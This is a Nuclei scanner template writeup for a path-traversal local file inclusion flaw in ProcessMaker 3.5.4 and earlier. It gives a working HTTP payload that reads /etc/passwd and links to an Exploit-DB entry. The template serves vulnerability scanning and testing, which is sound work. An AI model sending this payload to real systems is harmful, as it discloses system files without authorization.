# Nuclei Template: ProcessMaker <=3.5.4 - Local File Inclusion
**Template ID:** processmaker-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`processmaker-lfi.yaml`)

## Vulnerability Information & PoC

## Description
ProcessMaker 3.5.4 and prior is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}
GET /../../../..//etc/passwd HTTP/1.1
Host: {{Hostname}}
```

## References
- https://www.exploit-db.com/exploits/50229
- https://www.processmaker.com
